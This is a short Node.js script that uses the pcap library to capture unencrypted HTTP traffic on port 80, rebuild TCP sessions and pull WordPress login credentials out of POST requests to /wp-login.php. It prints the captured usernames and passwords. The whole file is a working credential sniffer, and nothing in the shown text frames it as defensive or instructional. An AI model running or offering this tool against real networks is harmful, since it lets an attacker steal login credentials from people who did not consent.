import pcap from 'pcap'

let tcp_tracker  = new pcap.TCPTracker();
let pcap_session = pcap.createSession('en0', 'tcp port 80');

console.log("Listening on " + pcap_session.device_name);

// listen for packets, decode them, and feed TCP to the tracker
pcap_session.on("packet", function (raw_packet) {
    let packet = pcap.decode.packet(raw_packet);
    tcp_tracker.track_packet(packet);
});

// tracker emits sessions, and sessions emit data
tcp_tracker.on("session", function (session) {
    //console.log("Start of TCP session between " + session.src_name + " and " + session.dst_name);
    session.on("data send", function (session, data) {
        let utf8 = data.toString('utf-8');
        if(utf8.indexOf('POST /wp-login.php') >= 0) {
            let parsed = utf8.split("\r\n").pop().split('&');
            //console.log(parsed);
            let response = {};
            parsed.forEach(data => {
                if(data.indexOf('log=') >= 0) {
                    response.username = data.split('=').pop();
                }
                if(data.indexOf('pwd=') >= 0) {
                    response.password = data.split('=').pop();
                }
            });
            console.log(response);
        }
        //console.log(session.src_name + " -> " + session.dst_name + " data send " + session.send_bytes_payload + " + " + data.length + " bytes");
    });
    session.on("data recv", function (session, data) {
        //console.log(session.dst_name + " -> " + session.src_name + " data recv " + session.recv_bytes_payload + " + " + data.length + " bytes");
    });
    session.on("end", function (session) {
        //console.log("End of TCP session between " + session.src_name + " and " + session.dst_name);
        //console.log("Set stats for session: ", session.session_stats());
    });
});